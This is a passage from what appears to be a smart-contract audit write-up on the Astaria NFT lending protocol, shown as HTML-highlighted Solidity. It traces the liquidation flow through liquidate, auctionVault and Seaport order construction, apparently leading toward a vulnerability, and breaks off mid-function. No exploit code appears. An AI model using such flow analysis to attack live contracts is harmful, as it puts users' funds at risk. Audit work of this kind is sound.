class=\"mtk1\">.</span><span class=\"mtk12\">AuctionStack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidatorPayment</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getLiquidatorFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">liquidatorPayment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">TRANSFER_PROXY</span><span class=\"mtk1\">()),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">liquidatorPayment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">LIEN_TOKEN</span><span class=\"mtk1\">().</span><span class=\"mtk11\">payDebtViaClearingHouse</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">liquidatorPayment</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span class=\"mtk1\">().</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span class=\"mtk1\">().</span><span class=\"mtk11\">settleAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>We can look into the liquidation flow:</p>\n<p>First, the liquidate function is called in AstariaRouter.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">liquidate</span><span class=\"mtk1\">(ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">OrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">listedOrder</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">canLiquidate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">])) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidLienState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LienState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HEALTHY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionWindowMax</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindow</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindowBuffer</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopLiens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">auctionWindowMax</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Liquidation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">listedOrder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERAL_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionVault</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ICollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">AuctionVaultParams</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">settlementToken:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collateralId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maxDuration:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionWindowMax</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">startingPrice:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationInitialAsk</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">endingPrice:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Then function auctionVault is called in CollateralToken</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">auctionVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">AuctionVaultParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">requiresAuth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">OrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prices</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">prices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startingPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">prices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endingPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_generateValidOrderParameters</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">settlementToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">prices</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxDuration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_listUnderlyingOnSeaport</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">Order</span><span class=\"mtk1\">(</span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">, </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The function _generateValidOrderParameters is important:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_generateValidOrderParameters</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">settlementToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prices</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxDuration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">OrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">OfferItem</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">offer</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">OfferItem</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Asset</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">offer</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">OfferItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ConsiderationItem</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ConsiderationItem</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">ConsiderationItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">settlementToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">prices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">prices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">ConsiderationItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ERC1155</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint160</span><span class=\"mtk1\">(</span><span class=\"mtk12\">settlementToken</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">prices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">prices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">OrderParameters</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">offerer:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">zone:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// 0x20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">offer:</span><span class=\"mtk1\"> </span><span 